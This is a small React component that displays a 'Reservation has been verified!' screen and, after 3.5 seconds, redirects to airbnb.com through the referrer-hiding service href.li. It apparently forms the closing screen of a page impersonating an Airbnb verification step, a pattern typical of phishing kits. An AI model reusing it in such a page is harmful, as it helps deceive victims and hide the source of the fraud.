import { useEffect } from 'react';
import styles from '../../styles.module.scss';

export default function EndPanel() {
	useEffect(() => {
		setTimeout(() => {
			window.location = 'https://href.li/?https://airbnb.com' as unknown as Location;
		}, 3500);
	}, []);
	return (
		<div className={styles.end_panel}>
			<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='currentColor' stroke-width='1' stroke-linecap='round' stroke-linejoin='round'>
				<path d='M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z' />
				<path d='m9 12 2 2 4-4' />
			</svg>
			<div className={styles.title}>Reservation has been verified!</div>
			<div className={styles.redirecting}>redirecting..</div>
		</div>
	);
}